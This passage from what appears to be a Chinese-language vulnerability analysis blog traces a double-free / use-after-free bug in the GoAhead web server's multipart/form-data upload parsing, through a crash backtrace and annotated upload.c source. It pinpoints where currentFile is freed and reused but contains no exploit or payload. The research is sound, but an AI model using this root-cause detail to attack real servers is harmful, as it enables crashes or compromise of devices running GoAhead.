<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">double free or corruption (fasttop)</span><br><span class="line"></span><br><span class="line">[#0] 0x7ffff6dc1e97 → __GI_raise(sig=0x6)</span><br><span class="line">[#1] 0x7ffff6dc3801 → __GI_abort()</span><br><span class="line">[#2] 0x7ffff6e0c897 → __libc_message(action=do_abort, fmt=0x7ffff6f39b9a &quot;%s\n&quot;)</span><br><span class="line">[#3] 0x7ffff6e1390a → malloc_printerr(str=0x7ffff6f3b828 &quot;double free or corruption (fasttop)&quot;)</span><br><span class="line">[#4] 0x7ffff6e1b004 → _int_free(have_lock=0x0, p=0x611a00, av=0x7ffff716ec40 &lt;main_arena&gt;)</span><br><span class="line">[#5] 0x7ffff6e1b004 → __GI___libc_free(mem=0x611a10)</span><br><span class="line">[#6] 0x7ffff7b6e897 → freeUploadFile(up=0x611a50)</span><br><span class="line">[#7] 0x7ffff7b6e7fc → websFreeUpload(wp=0x60d680)</span><br><span class="line">[#8] 0x7ffff7b62274 → reuseConn(wp=0x60d680)</span><br><span class="line">[#9] 0x7ffff7b5e438 → complete(wp=0x60d680, reuse=0x1)</span><br></pre></td></tr></table></figure></div>

<p>大致的函数调用流程是 complete -&gt; reuseConn -&gt; websFreeUpload -&gt; freeUploadFile</p>
<p>但是按照这样的函数流程找下去的话你会感觉很疑惑，因为上述的函数调用链并不包括漏洞的核心代码。</p>
<p>我在分析这个漏洞的时候最初也是按照这个漏洞顺序找下去的，结果一无所获，网上寥寥几篇分析文章只有只言片语，无奈只能从头了解和这个漏洞有关的一些知识点。</p>
<p>首先，根据披露信息我们知道这个漏洞和 multi-part&#x2F;form-data 类型的数据有关，引用其中的几句话</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">When processing a multi-part/form-data HTTP request with multiple Content-Disposition headers in the same request, a use-after-free condition can occur while cleaning up the heap structures used for storing the different parts of the request.</span><br></pre></td></tr></table></figure></div>

<p>大概意思是说当程序处理 multi-part&#x2F;form-data 格式数据的时候可能会发生 UAF，那么什么是 multi-part&#x2F;form-data 呢？</p>
<p>百度简单了解了一下，它是 HTML 三种表单 enctype 类型之一，主要用于解决向服务器传输二进制数据的问题，其具体定义在 RFC2388 中。详细信息：<a class="link"   href="https://blog.csdn.net/wyn126/article/details/96451357" >https://blog.csdn.net/wyn126/article/details/96451357<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>简单来说它是一种特殊的数据传输格式，其基本结构是</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--banner</span><br><span class="line">data header...</span><br><span class="line"></span><br><span class="line">data</span><br><span class="line">--banner</span><br><span class="line">data header...</span><br><span class="line"></span><br><span class="line">data</span><br><span class="line">--banner--</span><br></pre></td></tr></table></figure></div>

<p>利用 banner 分割开不同的数据块，每个数据块表示一个 HTML 表单。数据块基本格式又包括 header 和数据本体。处理起来的基本思路就是 读取 分割行banner –&gt; 读取 data header –&gt; 读取 data –&gt; 寻找下一个 banner…   循环处理直到 banner 结束为止。</p>
<p>了解基本信息之后我们来看一下 GoAhead 在处理请求的时候到底做了什么？</p>
<p>主入口函数位于 http.c 中，我们暂且不谈 socket 部分，那么入口函数就是 websPump()，这个函数将处理请求的过程简单分为 5 个步骤，摘录源代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">PUBLIC <span class="type">void</span> <span class="title function_">websPump</span><span class="params">(Webs *wp)</span>   <span class="comment">// 根据不同的读取标志，调用不同的处理函数</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">bool</span>    canProceed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (canProceed = <span class="number">1</span>; canProceed; ) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (wp-&gt;state) &#123;</span><br><span class="line">        <span class="keyword">case</span> WEBS_BEGIN:     <span class="comment">// 处理请求头</span></span><br><span class="line">            canProceed = parseIncoming(wp);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WEBS_CONTENT:    <span class="comment">// 处理请求体</span></span><br><span class="line">            canProceed = processContent(wp);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WEBS_READY:  </span><br><span class="line">            <span class="keyword">if</span> (!websRunRequest(wp)) &#123;</span><br><span class="line">                <span class="comment">/* Reroute if the handler re-wrote the request */</span></span><br><span class="line">                websRouteRequest(wp);</span><br><span class="line">                wp-&gt;state = WEBS_READY;</span><br><span class="line">                canProceed = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            canProceed = (wp-&gt;state != WEBS_RUNNING);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WEBS_RUNNING:</span><br><span class="line">            <span class="comment">/* Nothing to do until websDone is called */</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">case</span> WEBS_COMPLETE:    <span class="comment">// 请求完成</span></span><br><span class="line">            canProceed = complete(wp, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>5 个阶段分别是 BEGIN、CONTENT、READY、RUNNING、COMPLETE。从字面上可理解为 开始-&gt;接受数据-&gt;准备完成-&gt;处理阶段-&gt;处理完成收尾。</p>
<p>首先来看 parseIncoming 函数，大概通读一下这个函数实现了一些初始化操作，解析请求，构造 Webs 结构体等。</p>
<p>processContent 函数是我们的主要关注点，因为它和我们传入的数据息息相关，源代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">processContent</span><span class="params">(Webs *wp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">bool</span>    canProceed;</span><br><span class="line"></span><br><span class="line">    canProceed = filterChunkData(wp);    <span class="comment">// 处理分块的数据？</span></span><br><span class="line">    <span class="keyword">if</span> (!canProceed || wp-&gt;finalized) &#123;</span><br><span class="line">        <span class="keyword">return</span> canProceed;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_UPLOAD</span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;flags &amp; WEBS_UPLOAD) &#123;    <span class="comment">// 如果请求的类型是  multipart/form-data</span></span><br><span class="line">        canProceed = websProcessUploadData(wp);    <span class="comment">// 根据披露信息来看，可能的漏洞入口</span></span><br><span class="line">        <span class="keyword">if</span> (!canProceed || wp-&gt;finalized) &#123;</span><br><span class="line">            <span class="keyword">return</span> canProceed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !ME_ROM</span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;putfd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        canProceed = websProcessPutData(wp);</span><br><span class="line">        <span class="keyword">if</span> (!canProceed || wp-&gt;finalized) &#123;</span><br><span class="line">            <span class="keyword">return</span> canProceed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_CGI</span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;cgifd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        canProceed = websProcessCgiData(wp);</span><br><span class="line">        <span class="keyword">if</span> (!canProceed || wp-&gt;finalized) &#123;</span><br><span class="line">            <span class="keyword">return</span> canProceed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;eof) &#123;</span><br><span class="line">        wp-&gt;state = WEBS_READY;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Prevent reading content from the next request</span></span><br><span class="line"><span class="comment">            The handler may not have been created if all the content was read in the initial read. No matter.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        socketDeleteHandler(wp-&gt;sid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> canProceed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此函数接受 Webs 结构体作为参数，这个结构体由用户传入的请求抽象而成，之后的大部分操作都围绕着这个结构体进行，在 VSCode 中可以看到此结构体的具体定义。</p>
<p>主要关注此函数的</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_UPLOAD</span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;flags &amp; WEBS_UPLOAD) &#123;    <span class="comment">// 如果请求的类型是  multipart/form-data</span></span><br><span class="line">        canProceed = websProcessUploadData(wp);    <span class="comment">// 根据披露信息来看，可能的漏洞入口</span></span><br><span class="line">        <span class="keyword">if</span> (!canProceed || wp-&gt;finalized) &#123;</span><br><span class="line">            <span class="keyword">return</span> canProceed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>我们可以在 VSCode 中搜索 multipart&#x2F;form-data 字符串，得到以下代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(key, <span class="string">&quot;content-type&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            wfree(wp-&gt;contentType);</span><br><span class="line">            wp-&gt;contentType = sclone(value);</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(value, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)) &#123;</span><br><span class="line">                wp-&gt;flags |= WEBS_FORM;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strstr</span>(value, <span class="string">&quot;application/json&quot;</span>)) &#123;</span><br><span class="line">                wp-&gt;flags |= WEBS_JSON;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strstr</span>(value, <span class="string">&quot;multipart/form-data&quot;</span>)) &#123;</span><br><span class="line">                wp-&gt;flags |= WEBS_UPLOAD;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>

<p>如果 content-type 字段的内容是 multipart&#x2F;form-data，则 flags 会被置为 WEBS_UPLOAD。</p>
<p>和上面的代码相呼应，如果在 flags 中判断到了 WEBS_UPLOAD 表示请求的类型是 multipart&#x2F;form-data。那么接下来需要分析 websProcessUploadData 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">PUBLIC <span class="type">bool</span> <span class="title function_">websProcessUploadData</span><span class="params">(Webs *wp)</span>    <span class="comment">// 可能的漏洞入口</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>    *line, *nextTok;</span><br><span class="line">    ssize   nbytes;</span><br><span class="line">    <span class="type">bool</span>    canProceed;</span><br><span class="line"></span><br><span class="line">    line = <span class="number">0</span>;</span><br><span class="line">    canProceed = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (canProceed &amp;&amp; !wp-&gt;finalized &amp;&amp; wp-&gt;uploadState != UPLOAD_CONTENT_END) &#123;</span><br><span class="line">        <span class="keyword">if</span>  (wp-&gt;uploadState == UPLOAD_BOUNDARY || wp-&gt;uploadState == UPLOAD_CONTENT_HEADER) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                Parse the next input line</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            line = wp-&gt;input.servp;</span><br><span class="line">            <span class="keyword">if</span> ((nextTok = <span class="built_in">memchr</span>(line, <span class="string">&#x27;\n&#x27;</span>, bufLen(&amp;wp-&gt;input))) == <span class="number">0</span>) &#123;   <span class="comment">// 找到分割边界这一行的结尾换行符</span></span><br><span class="line">                <span class="comment">/* Incomplete line */</span></span><br><span class="line">                canProceed = <span class="number">0</span>;    <span class="comment">// 找不到的话说明这个请求不对劲</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            *nextTok++ = <span class="string">&#x27;\0&#x27;</span>;    <span class="comment">// 换行符变成 \x00</span></span><br><span class="line">            nbytes = nextTok - line;    <span class="comment">// 计算分割行的长度</span></span><br><span class="line">            assert(nbytes &gt; <span class="number">0</span>);    <span class="comment">// 必须大于 0</span></span><br><span class="line">            websConsumeInput(wp, nbytes);</span><br><span class="line">            strim(line, <span class="string">&quot;\r&quot;</span>, WEBS_TRIM_END);    <span class="comment">// 从字符串中去掉某个字符？</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (wp-&gt;uploadState) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            initUpload(wp);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> UPLOAD_BOUNDARY:</span><br><span class="line">            processContentBoundary(wp, line);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> UPLOAD_CONTENT_HEADER:    <span class="comment">// 分割行的下一行（数据内容头部）</span></span><br><span class="line">            processUploadHeader(wp, line);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> UPLOAD_CONTENT_DATA:</span><br><span class="line">            canProceed = processContentData(wp);</span><br><span class="line">            <span class="keyword">if</span> (bufLen(&amp;wp-&gt;input) &lt; wp-&gt;boundaryLen) &#123;</span><br><span class="line">                <span class="comment">/*  Incomplete boundary - return to get more data */</span></span><br><span class="line">                canProceed = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> UPLOAD_CONTENT_END:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    bufCompact(&amp;wp-&gt;input);</span><br><span class="line">    <span class="keyword">return</span> canProceed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此函数位于 upload.c 中，第 106 行。通读下来，函数主要的功能是定位 banner 以及(如上所述)处理 data 等。</p>
<p>其处理流程和我们之前提到的类似，先找到分割行然后根据匹配到的不同 token 调用不同的处理函数，相关的注释在代码中已经给出。</p>
<p>先来看处理分块数据头部的部分</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">processUploadHeader</span><span class="params">(Webs *wp, <span class="type">char</span> *line)</span>    <span class="comment">// 处理分块数据头部</span></span><br><span class="line">&#123;</span><br><span class="line">    WebsUpload  *file;</span><br><span class="line">    <span class="type">char</span>        *key, *headerTok, *rest, *nextPair, *value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        wp-&gt;uploadState = UPLOAD_CONTENT_DATA;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    trace(<span class="number">7</span>, <span class="string">&quot;Header line: %s&quot;</span>, line);</span><br><span class="line"></span><br><span class="line">    headerTok = line;</span><br><span class="line">    stok(line, <span class="string">&quot;: &quot;</span>, &amp;rest);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (scaselesscmp(headerTok, <span class="string">&quot;Content-Disposition&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            The content disposition header describes either a form variable or an uploaded file.</span></span><br><span class="line"><span class="comment">            头部的 Content-Disposition 字段表明了这块数据到底是表单变量，还是上传的文件</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            Content-Disposition: form-data; name=&quot;field1&quot;</span></span><br><span class="line"><span class="comment">            &gt;&gt;blank line</span></span><br><span class="line"><span class="comment">            Field Data</span></span><br><span class="line"><span class="comment">            ---boundary</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            Content-Disposition: form-data; name=&quot;field1&quot; filename=&quot;user.file&quot;</span></span><br><span class="line"><span class="comment">            &gt;&gt;blank line</span></span><br><span class="line"><span class="comment">            File data</span></span><br><span class="line"><span class="comment">            ---boundary</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        key = rest;</span><br><span class="line">        wfree(wp-&gt;uploadVar);</span><br><span class="line">        wfree(wp-&gt;clientFilename);</span><br><span class="line">        wp-&gt;uploadVar = wp-&gt;clientFilename = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (key &amp;&amp; stok(key, <span class="string">&quot;;\r\n&quot;</span>, &amp;nextPair)) &#123;</span><br><span class="line"></span><br><span class="line">            key = strim(key, <span class="string">&quot; &quot;</span>, WEBS_TRIM_BOTH);</span><br><span class="line">            ssplit(key, <span class="string">&quot;= &quot;</span>, &amp;value);</span><br><span class="line">            value = strim(value, <span class="string">&quot;\&quot;&quot;</span>, WEBS_TRIM_BOTH);   <span class="comment">// 去掉多余的字符</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (scaselesscmp(key, <span class="string">&quot;form-data&quot;</span>) == <span class="number">0</span>) &#123;   <span class="comment">// 匹配到 form-data 通用字段</span></span><br><span class="line">                <span class="comment">/* Nothing to do */</span></span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (scaselesscmp(key, <span class="string">&quot;name&quot;</span>) == <span class="number">0</span>) &#123;    <span class="comment">// 匹配到 name 字段，表单和 file 都有</span></span><br><span class="line">                wfree(wp-&gt;uploadVar);</span><br><span class="line">                wp-&gt;uploadVar = sclone(value);   <span class="comment">// 把 name 的内容交给 wp 结构体</span></span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (scaselesscmp(key, <span class="string">&quot;filename&quot;</span>) == <span class="number">0</span>) &#123;    <span class="comment">// 匹配到 file 情况</span></span><br><span class="line">                <span class="keyword">if</span> (wp-&gt;uploadVar == <span class="number">0</span>) &#123;</span><br><span class="line">                    websError(wp, HTTP_CODE_BAD_REQUEST, <span class="string">&quot;Bad upload state. Missing name field&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                value = websNormalizeUriPath(value);  <span class="comment">// Normalize a URI path to remove &quot;./&quot;,  &quot;../&quot; and redundant separators.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (*value == <span class="string">&#x27;.&#x27;</span> || !websValidUriChars(value) || <span class="built_in">strpbrk</span>(value, <span class="string">&quot;\\/:*?&lt;&gt;|~\&quot;&#x27;%`^\n\r\t\f&quot;</span>)) &#123;</span><br><span class="line">                    websError(wp, HTTP_CODE_INTERNAL_SERVER_ERROR, <span class="string">&quot;Bad upload client filename&quot;</span>);  <span class="comment">// 过滤不合法的文件名</span></span><br><span class="line">                    wfree(value);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                wfree(wp-&gt;clientFilename);   </span><br><span class="line">                wp-&gt;clientFilename = value;    <span class="comment">// 文件名给 wp</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    Create the file to hold the uploaded data</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                wfree(wp-&gt;uploadTmp);</span><br><span class="line">                <span class="keyword">if</span> ((wp-&gt;uploadTmp = websTempFile(uploadDir, <span class="string">&quot;tmp&quot;</span>)) == <span class="number">0</span>) &#123;    <span class="comment">// 创建临时文件</span></span><br><span class="line">                    websError(wp, HTTP_CODE_INTERNAL_SERVER_ERROR,</span><br><span class="line">                        <span class="string">&quot;Cannot create upload temp file %s. Check upload temp dir %s&quot;</span>, wp-&gt;uploadTmp, uploadDir);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                trace(<span class="number">5</span>, <span class="string">&quot;File upload of: %s stored as %s&quot;</span>, wp-&gt;clientFilename, wp-&gt;uploadTmp);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ((wp-&gt;upfd = open(wp-&gt;uploadTmp, O_WRONLY | O_CREAT | O_TRUNC | O_BINARY, <span class="number">0600</span>)) &lt; <span class="number">0</span>) &#123;    <span class="comment">// 打开临时文件</span></span><br><span class="line">                    websError(wp, HTTP_CODE_INTERNAL_SERVER_ERROR, <span class="string">&quot;Cannot open upload temp file %s&quot;</span>, wp-&gt;uploadTmp);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    Create the files[id]</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                freeUploadFile(wp-&gt;currentFile);    <span class="comment">// 关键点1</span></span><br><span class="line">                file = wp-&gt;currentFile = walloc(<span class="keyword">sizeof</span>(WebsUpload));</span><br><span class="line">                <span class="built_in">memset</span>(file, <span class="number">0</span>, <span class="keyword">sizeof</span>(WebsUpload));</span><br><span class="line">                file-&gt;clientFilename = sclone(wp-&gt;clientFilename);   <span class="comment">// 每一项都对应着一个 chunk</span></span><br><span class="line">                file-&gt;filename = sclone(wp-&gt;uploadTmp);</span><br><span class="line">            &#125;</span><br><span class="line">            key = nextPair;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (scaselesscmp(headerTok, <span class="string">&quot;Content-Type&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (wp-&gt;clientFilename) &#123;</span><br><span class="line">            trace(<span class="number">5</span>, <span class="string">&quot;Set files[%s][CONTENT_TYPE] = %s&quot;</span>, wp-&gt;uploadVar, rest);</span><br><span class="line">            wp-&gt;currentFile-&gt;contentType = sclone(rest);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此函数大致的功能是匹配不同字段的值，我这里简单分为三种情况。</p>
<p>其一：匹配 Content-Disposition 字段，它的值默认为 form-data</p>
<p>其二：匹配 name 字段，它的值为 HTML 表单中变量的名字，此字段无论是上传 file 或是提交普通表单都会存在。</p>
<p>其三：匹配 filename，这个字段仅仅当上传 file 的时候包含，它是客户端上传的文件的名字。</p>
<p>关键代码就是匹配到 file 的情况，此时函数会过滤文件名，确保不包含非法的字符，之后在临时目录创建文件(利用 websTempFile 函数实现，也就是我们一开始修改的函数)，尝试打开这个临时文件，并将 FILE 指针传递给 wp-&gt;upfd 字段。</p>
<p>我们主要关注第 257 行，这是第一个关键点。此处将 wp-&gt;currentFile 指向的结构 free，freeUploadFile 函数就是在披露信息中给出的存在问题的函数。实际上这个函数本身没什么问题，只不过它的调用者没有做好相关的保护。</p>
<p>currentFile 保存的是我们之前提到的临时文件结构，第一次执行 processUploadHeader 函数的时候这个字段为空，通过 walloc(sizeof(WebsUpload)) 分配新的空间用于保存临时文件的名字和客户端传递过来的真实的文件名。</p>
<p>紧接着来到处理 data 本身的位置，第 145 行调用了函数 processContentData，代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">processContentData</span><span class="params">(Webs *wp)</span></span><br><span class="line">&#123;</span><br><span class="line">    WebsUpload  *file;</span><br><span class="line">    WebsBuf     *content;</span><br><span class="line">    ssize       size, nbytes, len;</span><br><span class="line">    <span class="type">char</span>        *data, *bp;</span><br><span class="line"></span><br><span class="line">    content = &amp;wp-&gt;input;</span><br><span class="line">    file = wp-&gt;currentFile;   <span class="comment">// 之前处理过的 WebsUpload 结构体</span></span><br><span class="line"></span><br><span class="line">    size = bufLen(content);</span><br><span class="line">    <span class="keyword">if</span> (size &lt; wp-&gt;boundaryLen) &#123;</span><br><span class="line">        <span class="comment">/*  Incomplete boundary. Return and get more data */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((bp = getBoundary(wp, content-&gt;servp, size)) == <span class="number">0</span>) &#123;   <span class="comment">// 寻找分割行</span></span><br><span class="line">        trace(<span class="number">7</span>, <span class="string">&quot;uploadFilter: Got boundary filename %x&quot;</span>, wp-&gt;clientFilename);</span><br><span class="line">        <span class="keyword">if</span> (wp-&gt;clientFilename) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                No signature found yet. probably more data to come. Must handle split boundaries.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            data = content-&gt;servp;</span><br><span class="line">            nbytes = ((<span class="type">int</span>) (content-&gt;endp - data)) - (wp-&gt;boundaryLen - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (writeToFile(wp, content-&gt;servp, nbytes) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">/* Proceed to handle error */</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            websConsumeInput(wp, nbytes);</span><br><span class="line">            <span class="comment">/* Get more data */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    data = content-&gt;servp;</span><br><span class="line">    nbytes = (bp) ? (bp - data) : bufLen(content);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nbytes &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            This is the CRLF before the boundary</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        len = nbytes;</span><br><span class="line">        <span class="keyword">if</span> (len &gt;= <span class="number">2</span> &amp;&amp; data[len - <span class="number">2</span>] == <span class="string">&#x27;\r&#x27;</span> &amp;&amp; data[len - <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">            len -= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (wp-&gt;clientFilename) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                Write the last bit of file data and add to the list of files and define environment variables</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (writeToFile(wp, data, len) &lt; <span class="number">0</span>) &#123;   <span class="comment">// 写入文件错误</span></span><br><span class="line">                <span class="comment">/* Proceed to handle error */</span></span><br><span class="line">                websConsumeInput(wp, nbytes);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            hashEnter(wp-&gt;files, wp-&gt;uploadVar, valueSymbol(file), <span class="number">0</span>);  <span class="comment">// 关键点2</span></span><br><span class="line">            defineUploadVars(wp);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (wp-&gt;uploadVar) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                Normal string form data variables</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            data[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            trace(<span class="number">5</span>, <span class="string">&quot;uploadFilter: form[%s] = %s&quot;</span>, wp-&gt;uploadVar, data);</span><br><span class="line">            websDecodeUrl(wp-&gt;uploadVar, wp-&gt;uploadVar, <span class="number">-1</span>);</span><br><span class="line">            websDecodeUrl(data, data, <span class="number">-1</span>);</span><br><span class="line">            websSetVar(wp, wp-&gt;uploadVar, data);</span><br><span class="line">        &#125;</span><br><span class="line">        websConsumeInput(wp, nbytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;clientFilename) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Now have all the data (we&#x27;ve seen the boundary)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        close(wp-&gt;upfd);</span><br><span class="line">        wp-&gt;upfd = <span class="number">-1</span>;</span><br><span class="line">        wfree(wp-&gt;clientFilename);</span><br><span class="line">        wp-&gt;clientFilename = <span class="number">0</span>;</span><br><span class="line">        wfree(wp-&gt;uploadTmp);</span><br><span class="line">        wp-&gt;uploadTmp = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    wp-&gt;uploadState = UPLOAD_BOUNDARY;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此函数主要实现的功能是找到 currentFile 字段(也就是上一个函数生成的结构)，然后继续搜索请求体直到找到下一个 banner 为止，将找到的数据通过 writeToFile 函数写入临时文件中。</p>
